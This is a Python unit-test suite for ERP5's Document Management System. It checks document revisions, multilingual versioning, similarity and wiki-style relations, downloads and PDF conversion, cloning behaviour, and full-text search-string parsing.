# -*- coding: utf-8 -*-
##############################################################################
#
# Copyright (c) 2004 Nexedi SARL and Contributors. All Rights Reserved.
#          Sebastien Robin <seb@nexedi.com>
#
# WARNING: This program as such is intended to be used by professional
# programmers who take the whole responsability of assessing all potential
# consequences resulting from its eventual inadequacies and bugs
# End users who are looking for a ready-to-use solution with commercial
# garantees and support are strongly adviced to contract a Free Software
# Service Company
#
# This program is Free Software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
#
##############################################################################

"""
  A test suite for Document Management System functionality.
  This will test:
  - creating Text Document objects
  - setting properties of a document, assigning local roles
  - setting relations between documents (explicit and implicity)
  - searching in basic and advanced modes
  - document publication workflow settings
  - sourcing external content
  - (...)
  This will NOT test:
  - contributing files of various types
  - convertion between many formats
  - metadata extraction and editing
  - email ingestion
  These are subject to another suite "testIngestion".
"""

import unittest
import time
import StringIO
from cgi import FieldStorage

import ZPublisher.HTTPRequest
import transaction
from Testing import ZopeTestCase
from Products.ERP5Type.tests.ERP5TypeTestCase import ERP5TypeTestCase
from Products.ERP5Type.tests.ERP5TypeTestCase import  _getConversionServerDict
from Products.ERP5Type.tests.utils import FileUpload
from Products.ERP5Type.tests.utils import DummyLocalizer
from Products.ERP5OOo.OOoUtils import OOoBuilder
from Products.CMFCore.utils import getToolByName
from AccessControl.SecurityManagement import newSecurityManager
from AccessControl import getSecurityManager
from zLOG import LOG
from Products.ERP5.Document.Document import NotConvertedError
from Products.ERP5Form.PreferenceTool import Priority
from Products.ERP5Type.tests.utils import createZODBPythonScript
from Products.ERP5Type.Globals import get_request
import os
from threading import Thread
import httplib
import urllib
from PIL import Image
from AccessControl import Unauthorized

QUIET = 0

TEST_FILES_HOME = os.path.join(os.path.dirname(__file__), 'test_document')
FILE_NAME_REGULAR_EXPRESSION = "(?P<reference>[A-Z]{3,10})-(?P<language>[a-z]{2})-(?P<version>[0-9]{3})"
REFERENCE_REGULAR_EXPRESSION = "(?P<reference>[A-Z]{3,10})(-(?P<language>[a-z]{2}))?(-(?P<version>[0-9]{3}))?"

def makeFilePath(name):
  return os.path.join(os.path.dirname(__file__), 'test_document', name)

def makeFileUpload(name, as_name=None):
  if as_name is None:
    as_name = name
  path = makeFilePath(name)
  return FileUpload(path, as_name)

class TestDocumentMixin(ERP5TypeTestCase):
  def setUpOnce(self):
    # set a dummy localizer (because normally it is cookie based)
    self.portal.Localizer = DummyLocalizer()
    # make sure every body can traverse document module
    self.portal.document_module.manage_permission('View', ['Anonymous'], 1)
    self.portal.document_module.manage_permission(
                           'Access contents information', ['Anonymous'], 1)
    transaction.commit()
    self.tic()

  def afterSetUp(self):
    TestDocumentMixin.login(self)
    self.setDefaultSitePreference()
    self.setSystemPreference()
    transaction.commit()
    self.tic()
    self.login()

  def setDefaultSitePreference(self):
    default_pref = self.portal.portal_preferences.default_site_preference
    conversion_dict = _getConversionServerDict()
    default_pref.setPreferredOoodocServerAddress(conversion_dict['hostname'])
    default_pref.setPreferredOoodocServerPortNumber(conversion_dict['port'])
    default_pref.setPreferredDocumentFileNameRegularExpression(FILE_NAME_REGULAR_EXPRESSION)
    default_pref.setPreferredDocumentReferenceRegularExpression(REFERENCE_REGULAR_EXPRESSION)
    if self.portal.portal_workflow.isTransitionPossible(default_pref, 'enable'):
      default_pref.enable()
    return default_pref

  def setSystemPreference(self):
    portal_type = 'System Preference'
    preference_list = self.portal.portal_preferences.contentValues(
                                                       portal_type=portal_type)
    if not preference_list:
      preference = self.portal.portal_preferences.newContent(
                                                       portal_type=portal_type)
    else:
      preference = preference_list[0]
    if self.portal.portal_workflow.isTransitionPossible(preference, 'enable'):
      preference.enable()
    return preference

  def getDocumentModule(self):
    return getattr(self.getPortal(),'document_module')

  def getBusinessTemplateList(self):
    return ('erp5_base',
            'erp5_ingestion', 'erp5_ingestion_mysql_innodb_catalog',
            'erp5_web', 'erp5_dms')

  def getNeededCategoryList(self):
    return ()

  def beforeTearDown(self):
    """
      Do some stuff after each test:
      - clear document module
    """
    transaction.abort()
    self.clearRestrictedSecurityHelperScript()
    activity_tool = self.portal.portal_activities
    activity_status = set(m.processing_node < -1
                          for m in activity_tool.getMessageList())
    if True in activity_status:
      activity_tool.manageClearActivities()
    else:
      assert not activity_status
    self.clearDocumentModule()

  conversion_format_permission_script_id_list = [
      'Document_checkConversionFormatPermission',
      'PDF_checkConversionFormatPermission']
  def clearRestrictedSecurityHelperScript(self):
    for script_id in self.conversion_format_permission_script_id_list:
      custom = self.getPortal().portal_skins.custom
      if script_id in custom.objectIds():
        custom.manage_delObjects(ids=[script_id])
        transaction.commit()

  def clearDocumentModule(self):
    """
      Remove everything after each run
    """
    transaction.abort()
    doc_module = self.getDocumentModule()
    doc_module.manage_delObjects(list(doc_module.objectIds()))
    transaction.commit()
    self.tic()

class TestDocument(TestDocumentMixin):
  """
    Test basic document - related operations
  """

  def getTitle(self):
    return "DMS"

  ## setup

  
  ## helper methods

  def createTestDocument(self, file_name=None, portal_type='Text', reference='TEST', version='002', language='en'):
    """
      Creates a text document
    """
    dm=self.getPortal().document_module
    doctext=dm.newContent(portal_type=portal_type)
    if file_name is not None:
      f = open(makeFilePath(file_name), 'rb')
      doctext.setTextContent(f.read())
      f.close()
    doctext.setReference(reference)
    doctext.setVersion(version)
    doctext.setLanguage(language)
    return doctext

  def getDocument(self, id):
    """
      Returns a document with given ID in the
      document module.
    """
    document_module = self.portal.document_module
    return getattr(document_module, id)

  def clearCache(self):
    self.portal.portal_caches.clearAllCache()

  ## tests

  def test_01_HasEverything(self):
    """
      Standard test to make sure we have everything we need - all the tools etc
    """
    self.assertNotEqual(self.getCategoryTool(), None)
    self.assertNotEqual(self.getSimulationTool(), None)
    self.assertNotEqual(self.getTypeTool(), None)
    self.assertNotEqual(self.getSQLConnection(), None)
    self.assertNotEqual(self.getCatalogTool(), None)
    self.assertNotEqual(self.getWorkflowTool(), None)

  def test_02_RevisionSystem(self):
    """
      Test revision mechanism
    """
    # create a test document
    # revision should be 1
    # upload file (can be the same) into it
    # revision should now be 2
    # edit the document with any value or no values
    # revision should now be 3
    # contribute the same file through portal_contributions
    # the same document should now have revision 4 (because it should have done mergeRevision)
    # getRevisionList should return (1, 2, 3, 4)
    filename = 'TEST-en-002.doc'
    file = makeFileUpload(filename)
    document = self.portal.portal_contributions.newContent(file=file)
    transaction.commit()
    self.tic()
    document_url = document.getRelativeUrl()
    def getTestDocument():
      return self.portal.restrictedTraverse(document_url)
    self.assertEqual(getTestDocument().getRevision(), '1')
    getTestDocument().edit(file=file)
    transaction.commit()
    self.tic()
    self.assertEqual(getTestDocument().getRevision(), '2')
    getTestDocument().edit(title='Hey Joe')
    transaction.commit()
    self.tic()
    self.assertEqual(getTestDocument().getRevision(), '3')
    another_document = self.portal.portal_contributions.newContent(file=file)
    transaction.commit()
    self.tic()
    self.assertEqual(getTestDocument().getRevision(), '4')
    self.assertEqual(getTestDocument().getRevisionList(), ['1', '2', '3', '4'])

  def test_03_Versioning(self):
    """
      Test versioning
    """
    # create a document 1, set coordinates (reference=TEST, version=002, language=en)
    # create a document 2, set coordinates (reference=TEST, version=002, language=en)
    # create a document 3, set coordinates (reference=TEST, version=004, language=en)
    # run isVersionUnique on 1, 2, 3 (should return False, False, True)
    # change version of 2 to 003
    # run isVersionUnique on 1, 2, 3  (should return True)
    # run getLatestVersionValue on all (should return 3)
    # run getVersionValueList on 2 (should return [3, 2, 1])
    document_module = self.getDocumentModule()
    docs = {}
    docs[1] = self.createTestDocument(reference='TEST', version='002', language='en')
    docs[2] = self.createTestDocument(reference='TEST', version='002', language='en')
    docs[3] = self.createTestDocument(reference='TEST', version='004', language='en')
    docs[4] = self.createTestDocument(reference='ANOTHER', version='002', language='en')
    transaction.commit()
    self.tic()
    self.failIf(docs[1].isVersionUnique())
    self.failIf(docs[2].isVersionUnique())
    self.failUnless(docs[3].isVersionUnique())
    docs[2].setVersion('003')
    transaction.commit()
    self.tic()
    self.failUnless(docs[1].isVersionUnique())
    self.failUnless(docs[2].isVersionUnique())
    self.failUnless(docs[3].isVersionUnique())
    self.failUnless(docs[1].getLatestVersionValue() == docs[3])
    self.failUnless(docs[2].getLatestVersionValue() == docs[3])
    self.failUnless(docs[3].getLatestVersionValue() == docs[3])
    version_list = [br.getRelativeUrl() for br in docs[2].getVersionValueList()]
    self.failUnless(version_list == [docs[3].getRelativeUrl(), docs[2].getRelativeUrl(), docs[1].getRelativeUrl()])

  def test_04_VersioningWithLanguage(self):
    """
      Test versioning with multi-language support
    """
    # create empty test documents, set their coordinates as follows:
    # (1) TEST, 002, en
    # (2) TEST, 002, fr
    # (3) TEST, 002, pl
    # (4) TEST, 003, en
    # (5) TEST, 003, sp
    # the following calls (on any doc) should produce the following output:
    # getOriginalLanguage() = 'en'
    # getLanguageList = ('en', 'fr', 'pl', 'sp')
    # getLatestVersionValue() = 4
    # getLatestVersionValue('en') = 4
    # getLatestVersionValue('fr') = 2
    # getLatestVersionValue('pl') = 3
    # getLatestVersionValue('ru') = None
    # change user language into 'sp'
    # getLatestVersionValue() = 5
    # add documents:
    # (6) TEST, 004, pl
    # (7) TEST, 004, en
    # getLatestVersionValue() = 7
    localizer = self.portal.Localizer
    document_module = self.getDocumentModule()
    docs = {}
    docs[1] = self.createTestDocument(reference='TEST', version='002', language='en')
    time.sleep(1) # time span here because catalog records only full seconds
    docs[2] = self.createTestDocument(reference='TEST', version='002', language='fr')
    time.sleep(1)
    docs[3] = self.createTestDocument(reference='TEST', version='002', language='pl')
    time.sleep(1)
    docs[4] = self.createTestDocument(reference='TEST', version='003', language='en')
    time.sleep(1)
    docs[5] = self.createTestDocument(reference='TEST', version='003', language='sp')
    time.sleep(1)
    transaction.commit()
    self.tic()
    doc = docs[2] # can be any
    self.failUnless(doc.getOriginalLanguage() == 'en')
    self.failUnless(doc.getLanguageList() == ['en', 'fr', 'pl', 'sp'])
    self.failUnless(doc.getLatestVersionValue() == docs[4]) # there are two latest - it chooses the one in user language
    self.failUnless(doc.getLatestVersionValue('en') == docs[4])
    self.failUnless(doc.getLatestVersionValue('fr') == docs[2])
    self.failUnless(doc.getLatestVersionValue('pl') == docs[3])
    self.failUnless(doc.getLatestVersionValue('ru') == None)
    localizer.changeLanguage('sp') # change user language
    self.failUnless(doc.getLatestVersionValue() == docs[5]) # there are two latest - it chooses the one in user language
    docs[6] = document_module.newContent(reference='TEST', version='004', language='pl')
    docs[7] = document_module.newContent(reference='TEST', version='004', language='en')
    transaction.commit()
    self.tic()
    self.failUnless(doc.getLatestVersionValue() == docs[7]) # there are two latest, neither in user language - it chooses the one in original language

  def test_06_testExplicitRelations(self):
    """
      Test explicit relations.
      Explicit relations are just like any other relation, so no need to test them here
      except for similarity cloud which we test.
    """
    # create test documents:
    # (1) TEST, 002, en
    # (2) TEST, 003, en
    # (3) ONE, 001, en
    # (4) TWO, 001, en
    # (5) THREE, 001, en
    # set 3 similar to 1, 4 to 3, 5 to 4
    # getSimilarCloudValueList on 4 should return 1, 3 and 5
    # getSimilarCloudValueList(depth=1) on 4 should return 3 and 5

    # create documents for test version and language
    # reference, version, language
    kw = {'portal_type': 'Drawing'}
    document1 = self.portal.document_module.newContent(**kw)
    document2 = self.portal.document_module.newContent(**kw)
    document3 = self.portal.document_module.newContent(**kw)
    document4 = self.portal.document_module.newContent(**kw)
    document5 = self.portal.document_module.newContent(**kw)

    document6 = self.portal.document_module.newContent(reference='SIX', version='001',
                                                                                    language='en',  **kw)
    document7 = self.portal.document_module.newContent(reference='SEVEN', version='001',
                                                                                    language='en',  **kw)
    document8 = self.portal.document_module.newContent(reference='SEVEN', version='001',
                                                                                    language='fr',  **kw)
    document9 = self.portal.document_module.newContent(reference='EIGHT', version='001',
                                                                                    language='en',  **kw)
    document10 = self.portal.document_module.newContent(reference='EIGHT', version='002',
                                                                                      language='en',  **kw)
    document11 = self.portal.document_module.newContent(reference='TEN', version='001',
                                                                                      language='en',  **kw)
    document12 = self.portal.document_module.newContent(reference='TEN', version='001',
                                                                                      language='fr',  **kw)
    document13 = self.portal.document_module.newContent(reference='TEN', version='002',
                                                                                      language='en',  **kw)

    document3.setSimilarValue(document1)
    document4.setSimilarValue(document3)
    document5.setSimilarValue(document4)

    document6.setSimilarValueList([document8,  document13])
    document7.setSimilarValue([document9])
    document11.setSimilarValue(document7)

    transaction.commit()
    self.tic()

    #if user language is 'en'
    self.portal.Localizer.changeLanguage('en')

    # 4 is similar to 3 and 5, 3 similar to 1, last version are the same
    self.assertSameSet([document1, document3, document5],
                       document4.getSimilarCloudValueList())
    self.assertSameSet([document3, document5],
                       document4.getSimilarCloudValueList(depth=1))

    self.assertSameSet([document7, document13],
                       document6.getSimilarCloudValueList())
    self.assertSameSet([document10, document13],
                       document7.getSimilarCloudValueList())
    self.assertSameSet([document7, document13],
                       document9.getSimilarCloudValueList())
    self.assertSameSet([],
                       document10.getSimilarCloudValueList())
    # 11 similar to 7, last version of 7 (en) is 7, similar of 7 is 9, last version of 9 (en) is 10
    self.assertSameSet([document7, document10],
                       document11.getSimilarCloudValueList())
    self.assertSameSet([document6, document7],
                       document13.getSimilarCloudValueList())

    transaction.commit()

    # if user language is 'fr', test that latest documents are prefferable returned in user_language (if available)
    self.portal.Localizer.changeLanguage('fr')

    self.assertSameSet([document8, document13],
                       document6.getSimilarCloudValueList())
    self.assertSameSet([document6, document13],
                       document8.getSimilarCloudValueList())
    self.assertSameSet([document8, document10],
                       document11.getSimilarCloudValueList())
    self.assertSameSet([],
                       document12.getSimilarCloudValueList())
    self.assertSameSet([document6, document8],
                       document13.getSimilarCloudValueList())

    transaction.commit()

    # if user language is "bg"
    self.portal.Localizer.changeLanguage('bg')
    self.assertSameSet([document8, document13],
                       document6.getSimilarCloudValueList())

  def test_07_testImplicitRelations(self):
    """
      Test implicit (wiki-like) relations.
    """
    # XXX this test should be extended to check more elaborate language selection

    def sqlresult_to_document_list(result):
      return [i.getObject() for i in result]

    # create docs to be referenced:
    # (1) TEST, 002, en
    filename = 'TEST-en-002.odt'
    file = makeFileUpload(filename)
    document1 = self.portal.portal_contributions.newContent(file=file)

    # (2) TEST, 002, fr
    as_name = 'TEST-fr-002.odt'
    file = makeFileUpload(filename, as_name)
    document2 = self.portal.portal_contributions.newContent(file=file)

    # (3) TEST, 003, en
    as_name = 'TEST-en-003.odt'
    file = makeFileUpload(filename, as_name)
    document3 = self.portal.portal_contributions.newContent(file=file)

    # create docs to contain references in text_content:
    # REF, 001, en; "I use reference to look up TEST"
    filename = 'REF-en-001.odt'
    file = makeFileUpload(filename)
    document4 = self.portal.portal_contributions.newContent(file=file)

    # REF, 002, en; "I use reference to look up TEST"
    filename = 'REF-en-002.odt'
    file = makeFileUpload(filename)
    document5 = self.portal.portal_contributions.newContent(file=file)

    # REFLANG, 001, en: "I use reference and language to look up TEST-fr"
    filename = 'REFLANG-en-001.odt'
    file = makeFileUpload(filename)
    document6 = self.portal.portal_contributions.newContent(file=file)

    # REFVER, 001, en: "I use reference and version to look up TEST-002"
    filename = 'REFVER-en-001.odt'
    file = makeFileUpload(filename)
    document7 = self.portal.portal_contributions.newContent(file=file)

    # REFVERLANG, 001, en: "I use reference, version and language to look up TEST-002-en"
    filename = 'REFVERLANG-en-001.odt'
    file = makeFileUpload(filename)
    document8 = self.portal.portal_contributions.newContent(file=file)

    transaction.commit()
    self.tic()
    # the implicit predecessor will find documents by reference.
    # version and language are not used.
    # the implicit predecessors should be:

    # for (1): REF-002, REFLANG, REFVER, REFVERLANG
    # document1's reference is TEST. getImplicitPredecessorValueList will
    # return latest version of documents which contains string "TEST".
    self.assertSameSet(
      [document5, document6, document7, document8],
      sqlresult_to_document_list(document1.getImplicitPredecessorValueList()))

    # clear transactional variable cache
    transaction.commit()

    # the implicit successors should be return document with appropriate
    # language.

    # if user language is 'en'.
    self.portal.Localizer.changeLanguage('en')

    self.assertSameSet(
      [document3],
      sqlresult_to_document_list(document5.getImplicitSuccessorValueList()))

    # clear transactional variable cache
    transaction.commit()

    # if user language is 'fr'.
    self.portal.Localizer.changeLanguage('fr')
    self.assertSameSet(
      [document2],
      sqlresult_to_document_list(document5.getImplicitSuccessorValueList()))

    # clear transactional variable cache
    transaction.commit()

    # if user language is 'ja'.
    self.portal.Localizer.changeLanguage('ja')
    self.assertSameSet(
      [document3],
      sqlresult_to_document_list(document5.getImplicitSuccessorValueList()))

  def testOOoDocument_get_size(self):
    # test get_size on OOoDocument
    doc = self.portal.document_module.newContent(portal_type='Spreadsheet')
    doc.edit(file=makeFileUpload('import_data_list.ods'))
    self.assertEquals(len(makeFileUpload('import_data_list.ods').read()),
                      doc.get_size())

  def testTempOOoDocument_get_size(self):
    # test get_size on temporary OOoDocument
    from Products.ERP5Type.Document import newTempOOoDocument
    doc = newTempOOoDocument(self.portal, 'tmp')
    doc.edit(data='OOo')
    self.assertEquals(len('OOo'), doc.get_size())

  def testOOoDocument_hasData(self):
    # test hasData on OOoDocument
    doc = self.portal.document_module.newContent(portal_type='Spreadsheet')
    self.failIf(doc.hasData())
    doc.edit(file=makeFileUpload('import_data_list.ods'))
    self.failUnless(doc.hasData())

  def testTempOOoDocument_hasData(self):
    # test hasData on TempOOoDocument
    from Products.ERP5Type.Document import newTempOOoDocument
    doc = newTempOOoDocument(self.portal, 'tmp')
    self.failIf(doc.hasData())
    doc.edit(file=makeFileUpload('import_data_list.ods'))
    self.failUnless(doc.hasData())

  def test_Owner_Base_download(self):
    # tests that owners can download OOo documents, and all headers (including
    # filenames) are set correctly
    doc = self.portal.document_module.newContent(
                                  source_reference='test.ods',
                                  portal_type='Spreadsheet')
    doc.edit(file=makeFileUpload('import_data_list.ods'))

    uf = self.portal.acl_users
    uf._doAddUser('member_user1', 'secret', ['Member', 'Owner'], [])
    user = uf.getUserById('member_user1').__of__(uf)
    newSecurityManager(None, user)

    response = self.publish('%s/Base_download' % doc.getPath(),
                            basic='member_user1:secret')
    self.assertEquals(makeFileUpload('import_data_list.ods').read(),
                      response.getBody())
    self.assertEquals('application/vnd.oasis.opendocument.spreadsheet',
                      response.headers['content-type'])
    self.assertEquals('attachment; filename="import_data_list.ods"',
                      response.headers['content-disposition'])
    self.tic()

  def test_Member_download_pdf_format(self):
    # tests that members can download OOo documents in pdf format (at least in
    # published state), and all headers (including filenames) are set correctly
    doc = self.portal.document_module.newContent(
                                  source_reference='test.ods',
                                  portal_type='Spreadsheet')
    doc.edit(file=makeFileUpload('import.file.with.dot.in.filename.ods'))
    doc.publish()
    transaction.commit()
    self.tic()
    transaction.commit()

    uf = self.portal.acl_users
    uf._doAddUser('member_user2', 'secret', ['Member'], [])
    user = uf.getUserById('member_user2').__of__(uf)
    newSecurityManager(None, user)

    response = self.publish('%s?format=pdf' % doc.getPath(),
                            basic='member_user2:secret')
    self.assertEquals('application/pdf', response.getHeader('content-type'))
    self.assertEquals('attachment; filename="import.file.with.dot.in.filename.pdf"',
                      response.getHeader('content-disposition'))
    self.assertEquals(response.getBody(), str(doc.convert('pdf')[1]))

    # test Print icon works on OOoDocument
    response = self.publish('%s/OOoDocument_print' % doc.getPath())
    self.assertEquals('application/pdf',
                      response.headers['content-type'])
    self.assertEquals('attachment; filename="import.file.with.dot.in.filename.pdf"',
                      response.headers['content-disposition'])

  def test_05_getCreationDate(self):
    """
    Check getCreationDate on all document type, as those documents
    are not associated to edit_workflow.
    """
    portal = self.getPortalObject()
    for document_type in portal.getPortalDocumentTypeList():
      module = portal.getDefaultModule(document_type)
      obj = module.newContent(portal_type=document_type)
      self.assertNotEquals(obj.getCreationDate(),
                           module.getCreationDate())
      self.assertNotEquals(obj.getCreationDate(),
                           portal.CreationDate())

  def test_Base_getConversionFormatItemList(self):
    # tests Base_getConversionFormatItemList script (requires oood)
    self.assertTrue(('Microsoft Excel 97/2000/XP', 'xls') in
        self.portal.Base_getConversionFormatItemList(base_content_type=
                  'application/vnd.oasis.opendocument.spreadsheet'))
    self.assertTrue(('DocBook', 'docbook.xml') in
        self.portal.Base_getConversionFormatItemList(base_content_type=
                  'application/vnd.oasis.opendocument.text'))

  def test_06_ProcessingStateOfAClonedDocument(self):
    """
    Check that the processing state of a cloned document
    is not draft
    """
    filename = 'TEST-en-002.doc'
    file = makeFileUpload(filename)
    document = self.portal.portal_contributions.newContent(file=file)

    self.assertEquals('converting', document.getExternalProcessingState())
    transaction.commit()
    self.assertEquals('converting', document.getExternalProcessingState())

    # Clone a uploaded document
    container = document.getParentValue()
    clipboard = container.manage_copyObjects(ids=[document.getId()])
    paste_result = container.manage_pasteObjects(cb_copy_data=clipboard)
    new_document = container[paste_result[0]['new_id']]

    self.assertEquals('converting', new_document.getExternalProcessingState())
    transaction.commit()
    self.assertEquals('converting', new_document.getExternalProcessingState())

    # Change workflow state to converted
    self.tic()
    self.assertEquals('converted', document.getExternalProcessingState())
    self.assertEquals('converted', new_document.getExternalProcessingState())

    # Clone a converted document
    container = document.getParentValue()
    clipboard = container.manage_copyObjects(ids=[document.getId()])
    paste_result = container.manage_pasteObjects(cb_copy_data=clipboard)
    new_document = container[paste_result[0]['new_id']]

    self.assertEquals('converted', new_document.getExternalProcessingState())
    transaction.commit()
    self.assertEquals('converted', new_document.getExternalProcessingState())
    self.tic()
    self.assertEquals('converted', new_document.getExternalProcessingState())

  def test_07_EmbeddedDocumentOfAClonedDocument(self):
    """
    Check the validation state of embedded document when its container is
    cloned
    """
    filename = 'TEST-en-002.doc'
    file = makeFileUpload(filename)
    document = self.portal.portal_contributions.newContent(file=file)

    sub_document = document.newContent(portal_type='Image')
    self.assertEquals('embedded', sub_document.getValidationState())
    transaction.commit()
    self.tic()
    self.assertEquals('embedded', sub_document.getValidationState())

    # Clone document
    container = document.getParentValue()
    clipboard = container.manage_copyObjects(ids=[document.getId()])

    paste_result = container.manage_pasteObjects(cb_copy_data=clipboard)
    new_document = container[paste_result[0]['new_id']]

    new_sub_document_list = new_document.contentValues(portal_type='Image')
    self.assertEquals(1, len(new_sub_document_list))
    new_sub_document = new_sub_document_list[0]
    self.assertEquals('embedded', new_sub_document.getValidationState())
    transaction.commit()
    self.tic()
    self.assertEquals('embedded', new_sub_document.getValidationState())

  def test_08_NoImagesCreatedDuringHTMLConversion(self):
    """Converting an ODT to html no longer creates Images embedded in the
    document.
    """
    filename = 'EmbeddedImage-en-002.odt'
    file = makeFileUpload(filename)
    document = self.portal.portal_contributions.newContent(file=file)

    transaction.commit()
    self.tic()

    self.assertEquals(0, len(document.contentValues(portal_type='Image')))
    document.convert(format='html')
    image_list = document.contentValues(portal_type='Image')
    self.assertEquals(0, len(image_list))

  def test_09_SearchableText(self):
    """
    Check DMS SearchableText capabilities.
    """
    portal = self.portal

    # Create a document.
    document_1 = self.portal.document_module.newContent(
                        portal_type = 'File',
                        description = 'Hello. ScriptableKey is very useful if you want to make your own search syntax.',
                        language = 'en',
                        version = '001')
    document_2 = self.portal.document_module.newContent(
                        portal_type='File',
                        description = 'This test make sure that scriptable key feature on ZSQLCatalog works.',
                        language='fr',
                        version = '002')
    document_3 = portal.document_module.newContent(
                   portal_type = 'Presentation',
                   title = "Complete set of tested reports with a long title.",
                   version = '003',
                   language = 'bg',
                   reference = 'tio-test-doc-3')
    person = portal.person_module.newContent(portal_type = 'Person', \
                                             reference= "john",
                                             title='John Doe Great')
    web_page = portal.web_page_module.newContent(portal_type = 'Web Page',
                                                 reference = "page_great_site",
                                                 text_content = 'Great website',
                                                 language='en',
                                                 version = '003')
    organisation = portal.organisation_module.newContent( \
                            portal_type = 'Organisation', \
                            reference = 'organisation-1',
                            title='Super nova organisation')
    self.stepTic()

    def getAdvancedSearchTextResultList(searchable_text, portal_type=None):
      kw = {'SearchableText': searchable_text}
      if portal_type is not None:
        kw['portal_type'] = portal_type
      return [x.getObject() for x in portal.portal_catalog(**kw)]

    # full text search
    self.assertSameSet([document_1], \
      getAdvancedSearchTextResultList('ScriptableKey'))
    self.assertEqual(len(getAdvancedSearchTextResultList('RelatedKey')), 0)
    self.assertSameSet([document_1, document_2], \
      getAdvancedSearchTextResultList('make'))
    self.assertSameSet([web_page, person], \
      getAdvancedSearchTextResultList("Great", ('Person', 'Web Page')))
    # full text search with whole title of a document
    self.assertSameSet([document_3], \
      getAdvancedSearchTextResultList(document_3.getTitle()))
    # full text search with reference part of searchable_text 
    # (i.e. not specified with 'reference:' - simply part of search text)
    self.assertSameSet([document_3], \
      getAdvancedSearchTextResultList(document_3.getReference()))

   # full text search with reference
    self.assertSameSet([web_page], \
      getAdvancedSearchTextResultList("reference:%s Great" %web_page.getReference()))
    self.assertSameSet([person],
          getAdvancedSearchTextResultList('reference:%s' %person.getReference()))

    # full text search with portal_type
    self.assertSameSet([person], \
      getAdvancedSearchTextResultList('%s portal_type:%s' %(person.getTitle(), person.getPortalType())))

    self.assertSameSet([organisation], \
      getAdvancedSearchTextResultList('%s portal_type:%s' \
                                       %(organisation.getTitle(),
                                         organisation.getPortalType())))

    # full text search with portal_type passed outside searchable_text
    self.assertSameSet([web_page, person],
                       getAdvancedSearchTextResultList('Great',
                          ('Person', 'Web Page')))
    self.assertSameSet([web_page], \
                       getAdvancedSearchTextResultList('Great', web_page.getPortalType()))
    self.assertSameSet([person], \
                       getAdvancedSearchTextResultList('Great', person.getPortalType()))
    
    # full text search with portal_type & reference
    self.assertSameSet([person], \
      getAdvancedSearchTextResultList('reference:%s portal_type:%s' \
                                        %(person.getReference(), person.getPortalType())))
    # full text search with language
    self.assertSameSet([document_1, web_page], \
      getAdvancedSearchTextResultList('language:en'))
    self.assertSameSet([document_1], \
      getAdvancedSearchTextResultList('Hello language:en'))
    self.assertSameSet([document_2], \
      getAdvancedSearchTextResultList('language:fr'))
    self.assertSameSet([web_page], \
      getAdvancedSearchTextResultList('%s reference:%s language:%s' \
                                       %(web_page.getTextContent(),
                                         web_page.getReference(),
                                         web_page.getLanguage())))
    # full text search with version
    self.assertSameSet([web_page], \
      getAdvancedSearchTextResultList('%s reference:%s language:%s version:%s' \
                                       %(web_page.getTextContent(),
                                         web_page.getReference(),
                                         web_page.getLanguage(),
                                         web_page.getVersion())))

  def test_10_SearchString(self):
    """
    Test search string search generation and parsing.
    """

    portal = self.portal
    assemble = portal.Base_assembleSearchString
    parse = portal.Base_parseSearchString
    
    # directly pasing searchable string
    self.assertEquals('searchable text',
                      assemble(**{'searchabletext': 'searchable text'}))
    kw = {'searchabletext_any': 'searchabletext_any',
          'searchabletext_phrase': 'searchabletext_phrase1 searchabletext_phrase1'}
    # exact phrase
    search_string = assemble(**kw)
    self.assertEquals('%s "%s"' %(kw['searchabletext_any'], kw['searchabletext_phrase']), \
                      search_string)
    parsed_string = parse(search_string)
    self.assertEquals(['searchabletext'], parsed_string.keys())

    
    # search "with all of the words"
    kw["searchabletext_all"] = "searchabletext_all1 searchabletext_all2"
    search_string = assemble(**kw)
    self.assertEquals('searchabletext_any "searchabletext_phrase1 searchabletext_phrase1"  +searchabletext_all1 +searchabletext_all2', \
                      search_string)
    parsed_string = parse(search_string)
    self.assertEquals(['searchabletext'], parsed_string.keys())
    
    # search without these words 
    kw["searchabletext_without"] = "searchabletext_without1 searchabletext_without2"
    search_string = assemble(**kw)
    self.assertEquals('searchabletext_any "searchabletext_phrase1 searchabletext_phrase1"  +searchabletext_all1 +searchabletext_all2 -searchabletext_without1 -searchabletext_without2', \
                      search_string)
    parsed_string = parse(search_string)
    self.assertEquals(['searchabletext'], parsed_string.keys())
    
    # search limited to a certain date range
    kw['created_within'] = '1w'
    search_string = assemble(**kw)
    self.assertEquals('searchabletext_any "searchabletext_phrase1 searchabletext_phrase1"  +searchabletext_all1 +searchabletext_all2 -searchabletext_without1 -searchabletext_without2 created:1w', \
                      search_string)
    parsed_string = parse(search_string)
    self.assertSameSet(['searchabletext', 'creation_from'], parsed_string.keys())
    
    # search with portal_type
    kw['search_portal_type'] = 'Document'
    search_string = assemble(**kw)
    parsed_string = parse(search_string)
    self.assertEquals('searchabletext_any "searchabletext_phrase1 searchabletext_phrase1"  +searchabletext_all1 +searchabletext_all2 -searchabletext_without1 -searchabletext_without2 created:1w AND (portal_type:Document)', \
                      search_string)
    self.assertSameSet(['searchabletext', 'creation_from', 'portal_type'], \
                        parsed_string.keys())
    self.assertEquals(kw['search_portal_type'], parsed_string['portal_type'])
    
    # search by reference
    kw['reference'] = 'Nxd-test'
    search_string = assemble(**kw)
    parsed_string = parse(search_string)
    self.assertEquals('searchabletext_any "searchabletext_phrase1 searchabletext_phrase1"  +searchabletext_all1 +searchabletext_all2 -searchabletext_without1 -searchabletext_without2 created:1w AND (portal_type:Document) reference:Nxd-test', \
                      search_string)
    self.assertSameSet(['searchabletext', 'creation_from', 'portal_type', 'reference'], \
                        parsed_string.keys())
    self.assertEquals(kw['search_portal_type'], parsed_string['portal_type'])
    self.assertEquals(kw['reference'], parsed_string['reference'])
    
    # search by version
    kw['version'] = '001'
    search_string = assemble(**kw)
    parsed_string = parse(search_string)
    self.assertEquals('searchabletext_any "searchabletext_phrase1 searchabletext_phrase1"  +searchabletext_all1 +searchabletext_all2 -searchabletext_without1 -searchabletext_without2 created:1w AND (portal_type:Document) reference:Nxd-test version:001', \
                      search_string)
    self.assertSameSet(['searchabletext', 'creation_from', 'portal_type', 'reference', 'version'], \
                        parsed_string.keys())
